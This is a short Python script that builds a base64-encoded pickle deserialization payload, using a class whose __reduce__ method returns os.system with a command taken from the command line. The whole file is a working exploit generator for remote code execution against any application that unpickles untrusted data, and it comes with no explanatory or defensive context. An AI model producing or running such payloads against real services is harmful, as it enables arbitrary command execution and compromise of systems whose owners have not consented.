
import pickle,base64,os,sys

try:
	command = sys.argv[1]
except IndexError as e:
	print("require a command")
	sys.exit()

class PAYLOAD(object):
	def __reduce__(self):
		return os.system, ("{}".format(command),)

b64Encoded = base64.b64encode(pickle.dumps(PAYLOAD(), protocol=0)).decode("utf-8")

print("Payload (Base64) => {}".format(b64Encoded))
